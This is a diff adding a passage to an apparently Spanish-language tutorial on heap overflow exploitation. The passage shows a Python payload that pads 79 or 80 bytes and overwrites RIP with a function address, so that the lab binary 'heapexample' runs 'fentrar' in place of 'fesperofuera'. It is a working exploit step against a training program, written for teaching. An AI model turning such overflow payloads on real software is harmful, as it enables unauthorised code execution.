@@ -184,6 +184,23 @@ gdb -q ./heapexample
 
 ![image](https://github.com/user-attachments/assets/17cdf647-e044-405c-96ba-a982fecbd9fa)
 
+De forma que si cogemos la primera instrucción de fentrar y la metemos en el RIP con el programa de python:
+```
+program.4:
+#!/usr/bin/python3
+#Seria lo ideal
+print('X' * 80 + '\xba\x11\x40\x00')
+#Por problemas con el caracter x00 podemos hacer
+print('X' * 79 + '\xba\x11\x40')
+```
+
+Podemos llegar a visualizar lo siguiente al ejecutar
+```
+./heapexample $(./program.4)
+```
+![image](https://github.com/user-attachments/assets/2ec6200c-be3a-4a96-9cb5-cb225e761c87)
+
+Viendo que hemos conseguido ejecutar nuestro código (fentrar que imprime "Pasando") en vez de la función fesperofuera.
 
 
 
